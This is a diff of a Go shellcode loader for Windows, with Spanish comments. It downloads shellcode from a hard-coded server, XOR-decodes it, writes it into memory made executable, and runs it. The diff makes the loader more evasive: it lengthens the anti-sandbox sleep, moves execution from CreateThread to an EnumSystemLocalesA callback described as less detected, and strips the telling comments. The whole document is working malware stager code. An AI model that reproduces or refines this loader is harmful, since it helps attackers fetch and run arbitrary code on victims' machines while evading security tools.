@@ -9,7 +9,7 @@ import (
 )
 
 const (
-	serverHost = "195.0.1.5" // Cambiar por IP real de Parrot
+	serverHost = "195.0.1.5"
 	serverPort = "8080"
 )
 
@@ -24,7 +24,7 @@ func xor(d, k []byte) []byte {
 }
 
 func main() {
-	time.Sleep(12 * time.Second) // anti-sandbox
+	time.Sleep(15 * time.Second)
 
 	resp, err := http.Get("http://" + serverHost + ":" + serverPort + "/sc")
 	if err != nil {
@@ -40,26 +40,21 @@ func main() {
 	size := uintptr(len(sc))
 
 	k32 := syscall.NewLazyDLL("kernel32.dll")
-	vAlloc := k32.NewProc("VirtualAlloc")
+	vAlloc   := k32.NewProc("VirtualAlloc")
 	vProtect := k32.NewProc("VirtualProtect")
-	cThread := k32.NewProc("CreateThread")
-	wfso := k32.NewProc("WaitForSingleObject")
+	enumLoc  := k32.NewProc("EnumSystemLocalesA")
 
-	// Allocar como RW primero (menos sospechoso que RWX directo)
-	addr, _, _ := vAlloc.Call(0, size, 0x3000, 0x04) // PAGE_READWRITE
+	addr, _, _ := vAlloc.Call(0, size, 0x3000, 0x04)
 	if addr == 0 {
 		return
 	}
 
-	// Copiar shellcode a memoria
 	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))
 	copy(dst[:size], sc)
 
-	// Cambiar a RX antes de ejecutar
 	var old uint32
-	vProtect.Call(addr, size, 0x20, uintptr(unsafe.Pointer(&old))) // PAGE_EXECUTE_READ
+	vProtect.Call(addr, size, 0x20, uintptr(unsafe.Pointer(&old)))
 
-	// Ejecutar en hilo nuevo
-	h, _, _ := cThread.Call(0, 0, addr, 0, 0, 0)
-	wfso.Call(h, 0xFFFFFFFF)
+	// Ejecutar via callback EnumSystemLocalesA — menos detectado que CreateThread
+	enumLoc.Call(addr, 0)
 }
